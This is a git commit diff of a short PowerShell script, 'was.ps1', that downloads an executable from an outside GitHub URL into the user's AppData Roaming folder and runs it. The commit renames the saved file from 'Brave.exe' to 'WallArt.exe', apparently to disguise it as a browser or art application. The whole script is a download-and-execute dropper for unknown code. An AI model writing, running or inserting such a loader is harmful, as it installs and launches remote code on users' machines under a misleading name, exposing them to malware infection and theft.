77347deada49620e0b5639b4e384f26fbfa52956
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2023-01-21 13:43:58 +0530

    Update was.ps1

--- was.ps1
+++ was.ps1
@@ -1,4 +1,4 @@
-$p="$HOME\AppData\Roaming\Brave.exe";
+$p="$HOME\AppData\Roaming\WallArt.exe";
 $e=New-Object System.Net.WebClient;
 $e.DownloadFile("https://raw.githubusercontent.com/Unknwn000/idk/main/main.exe",$p);
 Start-Process -FilePath $p
